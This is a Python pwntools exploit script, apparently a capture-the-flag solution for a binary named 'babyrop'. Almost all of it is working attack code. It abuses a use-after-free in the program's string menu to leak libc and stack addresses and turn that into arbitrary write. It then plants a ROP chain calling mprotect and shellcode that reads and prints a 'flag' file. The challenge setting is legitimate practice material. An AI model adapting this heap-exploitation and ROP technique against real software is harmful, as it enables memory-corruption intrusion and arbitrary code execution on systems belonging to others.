#!/usr/bin/env  python3
import struct
import pwn
import re
import time


"""
ourProcess: it starts a instance of "./babyrop"
    process, give easy handle over to 
    communicate with process and it's
    methods as the class methods

create_safe_string:
    will create safe string with supplied
    index, string length, and string

read_safe_string:
    will read safe string by sending necessary
    input to program and return output string

write_safe_string:
    will write safe string to given index,
    string value

free_safe_string;
    will free safe string at given index
"""
class ourProcess:
    def __init__(self):
        # communicating with babyrop program
        self.program  = pwn.process("./babyrop", env = {"LD_LIBRARY_PATH":"./"})
        #self.program = pwn.remote("mc.ax", 31245)

    def create_safe_string(self, index, str_len, string):
        # checks type of argument
        assert(isinstance(index, int))
        assert(isinstance(str_len, int))
        assert(isinstance(string, bytes))

        self.program.recvuntil(b"command: ")
        self.program.send(b"C\n")

        self.program.sendline(str(index).encode())

        self.program.recvuntil(b"string: ")
        self.program.sendline(str(str_len).encode())

        self.program.recvuntil(b"string: ")
        self.program.sendline(string)

    # An interface to communicate
    # with read_safe_string of program
    def read_safe_string(self, index):
        assert(isinstance(index, int))

        self.program.recvuntil(b"command: ")
        self.program.send(b"R\n")

        self.program.recvuntil(b"index: ")
        self.program.sendline(str(index).encode())

        value = self.program.recvuntil(b"\n") 
        value += self.program.recvuntil(b"\n") 

        return value.decode()

    # ...
    def write_safe_string(self, index, string):
        assert(isinstance(index, int))
        assert(isinstance(string, bytes))

        self.program.recvuntil(b"command: ")
        self.program.send(b"W\n")

        self.program.recvuntil(b"index: ")
        self.program.send((str(index) + "\n").encode())

        self.program.recvuntil(b"string: ")
        self.program.sendline(string) 


    # ...
    def free_safe_string(self, index):
        assert(isinstance(index, int))

        self.program.recvuntil(b"command: ")
        self.program.send(b"F\n")
        self.program.recvuntil(b"index: ")
        self.program.sendline(str(index).encode())

    # ...
    def exit(self):
        self.program.recvuntil(b"command: ")
        self.program.send(b"E\n")
        self.program.recvuntil(b"index: ")
        self.program.send(b"\x00\x0a")

    # returns process object
    def get_process(self):
        return self.program

    # close the process
    def close(self):
        self.program.close()

# returns qword from integer
def int2qword(num):
    return struct.pack("<Q", num)


# returns address from a string
# returned by read_from_safe_string
def offset_from_string(read_string):
    offset_list = re.sub("(.*bytes\n|\n)", "", read_string).split()
    offset_list.reverse()
    return int("".join(offset_list), 16)

# returns library offset
# from big chunks
def get_library_offset(inp):
    library_offset_list = inp.split()[12:20]
    library_offset_list.reverse()
    return int("".join(library_offset_list), 16) - 2051264


pwn.context.arch = "amd64"

shellcode = pwn.asm("""
sub rsp, 2000
mov QWORD PTR [rsp], 0x67616c66
mov eax, 2      # open system call
lea rdi, [rsp] 
mov esi, 0      # open file with read
syscall

mov edi, eax    # transfering file descriptor
mov eax, 0      # read system call
lea rsi, [rsp]
mov rdx, 100    # read 100 bytes from the file 
syscall         # store to stack

mov eax, 1      # calling write systemcall
mov edi, 1      # writing output to stdout
lea rsi, [rsp]  # reading from the stack
mov edx, 100    # write 100 bytes from the stack
syscall

mov eax, 231     # calling exit-group system call
mov edi, 0      # with status 0
syscall
""")

def main():
    i = 0
    new = ourProcess()

    # overlap struct 0 with string of 2
    # struct 1 and struct 2 are pointing
    # at same memory

    new.create_safe_string(0, 100, b"")
    new.create_safe_string(1, 100, b"")

    new.free_safe_string(0)
    new.free_safe_string(1)

    new.create_safe_string(2, 16, b"")

    # leak the address of main 
    # arena by creating doubly-linked list
    new.create_safe_string(3, 2000, b"")
    new.create_safe_string(4, 2000, b"")

    new.free_safe_string(3)
    new.free_safe_string(4)

    new.create_safe_string(5, 2000, b"")

    # library base
    library_base = get_library_offset(new.read_safe_string(5))

    # leak stack base address
    new.write_safe_string(2, int2qword(8) + int2qword(library_base+2053392))
    stack_base = offset_from_string(new.read_safe_string(0)) - 135123

    # leak stack local address
    new.write_safe_string(2, int2qword(8) + int2qword(library_base + 2057952))
    stack_local_offset = offset_from_string(new.read_safe_string(0))
    main_return_address = stack_local_offset-304
    
# do ropping
#gadget pop rdi; ret;
    new.write_safe_string(2, int2qword(8) + int2qword(main_return_address))
    new.write_safe_string(0, int2qword(library_base+0x000000000002d7dd))

    new.write_safe_string(2, int2qword(8) + int2qword(main_return_address+8))
    new.write_safe_string(0, int2qword(stack_base))

#gadget pop rsi; ret;
    new.write_safe_string(2, int2qword(8) + int2qword(main_return_address+16))
    new.write_safe_string(0, int2qword(library_base+0x000000000002eef9))

    new.write_safe_string(2, int2qword(8) + int2qword(main_return_address+24))
    new.write_safe_string(0, int2qword(0x21000))

#gadget pop rdx; ret;
    new.write_safe_string(2, int2qword(8) + int2qword(main_return_address+32))
    new.write_safe_string(0, int2qword(library_base+0x00000000000d9c2d))

    new.write_safe_string(2, int2qword(8) + int2qword(main_return_address+40))
    new.write_safe_string(0, int2qword(0x7))

#mprotect
    new.write_safe_string(2, int2qword(8) + int2qword(main_return_address+48))
    new.write_safe_string(0, int2qword(library_base+0x00107330))

    new.write_safe_string(2, int2qword(8) + int2qword(main_return_address+56))
    new.write_safe_string(0, int2qword(main_return_address+64))

#shellcode
    new.write_safe_string(2, int2qword(len(shellcode)) + int2qword(main_return_address+64))
    new.write_safe_string(0, shellcode)

# done ropping
    new.exit()
    print((new.get_process().recvall()).decode("utf-8", errors='ignore'))
    new.close()

if __name__ == '__main__':
    main()
